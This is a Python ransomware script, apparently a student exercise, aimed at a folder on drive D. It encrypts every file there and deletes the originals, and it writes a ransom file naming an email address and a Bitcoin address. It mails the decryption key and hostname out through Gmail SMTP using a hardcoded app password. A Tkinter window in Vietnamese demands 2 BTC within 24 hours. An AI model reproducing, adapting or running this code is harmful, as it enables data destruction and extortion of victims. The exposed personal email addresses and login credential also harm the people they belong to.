import os
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import messagebox
from datetime import datetime
import socket
import base64
import smtplib
import base64
import os


class RSW:
    def __init__(self):
        self.key = Fernet.generate_key()
        print(self.key)
        self.crypter = Fernet(self.key)
        self.disk = "D:/test"
        self.list_file = os.walk(self.disk)
        self.lock_all()

    def sendmail(self):
        encoded_key = base64.b64encode(self.key).decode('utf-8')
        receiver_email = "AnhLSH.B21AT027@stu.ptit.edu.vn"
        subject = socket.gethostname()
        email = "lesyhoanganh2503@gmail.com"

        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, 'lzwr yphs wbot gwci')
        msg = "Key for {}".format(encoded_key) + "\nDeviceName: {}".format(subject)
        server.sendmail(email, receiver_email, msg)
        print("Email sent successfully!")

    def encrypt_file(self, file_path):
        with open(file_path, 'rb') as file:
            plaintext = file.read()

        encrypted_text = self.crypter.encrypt(plaintext)

        with open(file_path + ".enc", 'wb') as file_encrypted:
            file_encrypted.write(encrypted_text)
        os.remove(file_path)

    def decrypt_file(self, file_path, key):
        with open(file_path, 'rb') as file:
            cyphertext = file.read()
        decode = Fernet(key)
        _data = decode.decrypt(cyphertext)
        with open(file_path.replace('.enc', ''), 'wb') as fp:
            fp.write(_data)
        os.remove(file_path)


    def lock_all(self):
        for root, _, files in self.list_file:
            for file_name in files:
                if not file_name.endswith('.enc'):
                    file_path = os.path.join(root, file_name)
                    self.encrypt_file(file_path)
            with open("D:/info.txt", "w") as f:
                f.write(f"email: lesyhoanganh2503@gmail.com")
                f.write(f"BTC address: 1LMcKyPmwebfygoeZP8E9jAMS2BcgH3Yip")
        self.sendmail()

    def handle_key(self, key):
        try:
            list_file = os.walk(self.disk)
            for root, _, files in list_file:
                for file_name in files:
                    if file_name.endswith('.enc'):
                        file_path = os.path.join(root, file_name)
                        self.decrypt_file(file_path, key)
            messagebox.showinfo("info", f"Đừng để bị hack nữa nhé!") 
        except:
            messagebox.showerror("Error", f"Key sai")


rsw = RSW()


def check_input():
    input_key = entry.get()
    rsw.handle_key(bytes(input_key, 'utf-8'))

root = tk.Tk()
root.title("Một số file đã bị mã hóa")
root.geometry("800x400")

message = """Ổ đĩa {} của bạn đã bị vô hiệu hóa.
Vui lòng thanh toán 2 BTC để nhận được key giải mã.
Thông tin liên hệ ở D:/info.txt.
Liên hệ sau 24h tiếp theo kể từ {} để tránh mất dữ liệu.""".format(rsw.disk, datetime.now().strftime('%H:%M:%S'))
label = tk.Label(root, text=message, font=("Arial", 14))
label.pack(pady=10)

font_size = 14

username_label = tk.Label(root, text="Nhập key", font=("Arial", font_size))
username_label.pack()
entry = tk.Entry(root, width=30, font=("Arial", font_size))
entry.pack(pady=5)

confirm_button = tk.Button(root, text="Xác nhận", command=check_input, font=("Arial", font_size))
confirm_button.pack(pady=10)

root.mainloop()